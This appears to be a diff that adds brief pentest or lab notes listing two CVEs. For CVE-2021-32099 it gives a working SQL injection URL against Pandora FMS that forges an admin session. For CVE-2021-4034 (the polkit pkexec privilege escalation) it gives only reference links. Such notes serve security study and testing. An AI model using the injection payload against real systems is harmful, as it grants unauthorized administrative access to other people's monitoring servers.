@@ -1,0 +1,5 @@
+- CVE-2021-32099
+  http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1
+- CVE-2021-4034
+  https://www.whitesourcesoftware.com/resources/blog/polkit-pkexec-vulnerability-cve-2021-4034/
+  https://www.thesecmaster.com/how-to-fix-the-polkit-privilege-escalation-vulnerability-cve-2021-4034/
